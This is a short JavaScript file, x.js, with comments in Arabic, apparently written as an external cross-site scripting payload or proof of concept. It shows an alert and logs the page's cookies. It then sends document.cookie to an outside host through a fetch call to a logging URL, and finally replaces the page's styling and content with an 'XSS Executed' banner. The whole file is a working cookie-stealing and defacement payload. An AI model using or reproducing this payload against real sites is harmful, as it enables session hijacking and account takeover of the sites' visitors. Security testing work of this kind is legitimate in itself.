// ✅ XSS payload from external script (x.js)
alert("✅ XSS via external script executed!");

// يمكنك الآن تنفيذ أي كود تحكم مثل سرقة بيانات:

// 1. طباعة كل الكوكيز
console.log("Document Cookies:", document.cookie);

// 2. إرسال الكوكيز إلى سيرفر خارجي (غرض توضيحي فقط)
fetch("https://xss.oma.rs/log?cookie=" + encodeURIComponent(document.cookie));

// 3. تعديل الصفحة كإثبات
document.body.style.background = "#111";
document.body.style.color = "#0f0";
document.body.innerHTML += "<h1 style='text-align:center'>🔥 XSS Executed from x.js</h1>";
